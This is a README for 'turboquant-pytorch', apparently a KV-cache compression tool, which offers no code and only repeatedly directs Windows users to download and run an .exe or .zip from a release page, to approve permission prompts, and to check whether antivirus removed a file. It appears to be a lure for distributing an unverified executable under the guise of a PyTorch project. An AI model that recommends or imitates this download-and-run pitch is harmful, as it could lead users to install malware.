# ⚡ turboquant-pytorch - Faster LLM Cache Compression

[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/palatalised-chancellorsville108/turboquant-pytorch/releases)

## 🧭 What this is

turboquant-pytorch is a Windows app for LLM cache compression. It uses PyTorch to help shrink KV cache data while keeping attention quality high.

It is built for people who want to run the app from a simple download page, then start using it on Windows with little setup.

## 📥 Download

Visit this page to download:

https://github.com/palatalised-chancellorsville108/turboquant-pytorch/releases

On that page, look for the latest release and download the Windows file that matches your system. In most cases, this will be an `.exe` file or a `.zip` file with the app inside.

## 🖥️ Windows requirements

Before you start, make sure your PC has:

- Windows 10 or Windows 11
- At least 8 GB RAM
- 2 GB free disk space
- An NVIDIA GPU if you want the best speed
- Python or PyTorch support only if the release notes say it is needed

If you just want to try the app, a newer laptop or desktop should work fine.

## 🚀 Getting started

1. Open the download page above.
2. Find the newest release.
3. Download the Windows file.
4. If the file is a `.zip`, right-click it and choose Extract All.
5. Open the folder you extracted.
6. Double-click the app file or installer.
7. If Windows asks for permission, choose Yes.
8. Follow the on-screen steps.

If the release comes as a single `.exe`, you can usually double-click it to start right away.

## 🛠️ First run

When you open the app for the first time, it may take a short while to load.

You may see options for:

- Model file selection
- Cache size
- Bit level settings
- Compression mode
- Output folder

If you are not sure what to choose, start with the default settings. Default values are usually the safest choice for a first run.

## 📦 What the app does

turboquant-pytorch helps reduce the size of KV cache data used by large language models.

In simple terms, this can help:

- Lower memory use
- Keep attention behavior close to the original
- Make long prompt runs easier to manage
- Improve how far a model can go before it fills memory

The project targets 3-bit compression with strong attention fidelity, so it is meant for users who want smaller cache size without a large drop in quality.

## 🎛️ Typical use

A common workflow looks like this:

1. Start the app.
2. Load a model or cache file.
3. Choose a compression level.
4. Run the process.
5. Save the compressed output.
6. Use the output in your model workflow.

If you only need a quick test, use the default path and default compression level first.

## 🔍 What to expect

You may see progress bars, file paths, and memory usage values.

That is normal. The app may also create new output files in the folder you select. Keep the original files in case you want to run the process again with different settings.

## 🧩 File types you may see

Depending on the release, you may get one or more of these:

- `.exe` for the app
- `.zip` for a packaged release
- `.dll` if the release includes support files
- `.json` for settings or saved config
- `.pt` or `.pth` for PyTorch model data

If you are unsure which file to open, use the main `.exe` file or read the release notes on the download page.

## 🧱 Simple setup tips

- Keep the app in a folder you can find later
- Use a short folder path, such as `C:\TurboQuant`
- Do not move files after the app is working unless you know they are no longer needed
- If Windows blocks the file, check whether it came from the release page and try again

## 🔁 Updating

When a new release is available:

1. Go back to the release page
2. Download the newest Windows file
3. Close the old app
4. Replace the old files if needed
5. Start the new version

If your settings are saved in a config file, you can keep that file and reuse it after the update.

## 🧪 Common checks

If the app does not start, check these items:

- The file finished downloading
- You extracted the `.zip` file if needed
- You opened the correct `.exe`
- Your antivirus did not remove a file
- Your system meets the basic Windows requirements

If the app opens but no files load, make sure the file path is correct and the file type matches what the app expects.

## 📚 Project focus

This project is a from-scratch PyTorch build of Google’s TurboQuant method for LLM KV cache compression.

That means it is focused on:

- Cache compression
- Attention fidelity
- Low-bit quantization
- PyTorch-based model work

It is a fit for users who want to work with model memory use and cache size on Windows.

## 🧰 For smooth use

Use these simple habits:

- Download from the release page only
- Keep your model files in one folder
- Use the same settings when comparing results
- Save output files with clear names
- Check free disk space before large runs

## 📌 Quick path

1. Visit the release page
2. Download the Windows release
3. Open the file
4. Follow the setup steps
5. Start compressing KV cache data